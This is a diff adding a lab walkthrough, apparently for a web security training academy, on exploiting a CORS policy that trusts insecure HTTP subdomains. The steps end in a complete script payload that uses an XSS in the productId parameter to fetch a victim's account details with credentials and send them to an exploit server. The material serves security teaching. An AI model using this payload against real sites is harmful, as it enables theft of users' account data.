@@ -326,8 +326,17 @@ STEP4: In the browser, go to the exploit server and enter the following HTML, re
                                           
 # In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application
 
+ EXAMPLE: 
+ STEP1: Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name. 
+ STEP2: Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP. 
+ STEP3: Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain. 
+ STEP4: Observe that the productID parameter is vulnerable to XSS. 
+ STEP5: In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID: 
+ 
+             <script>
+                document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+            </script>
 
-                                          
                                           
                                           
                                           
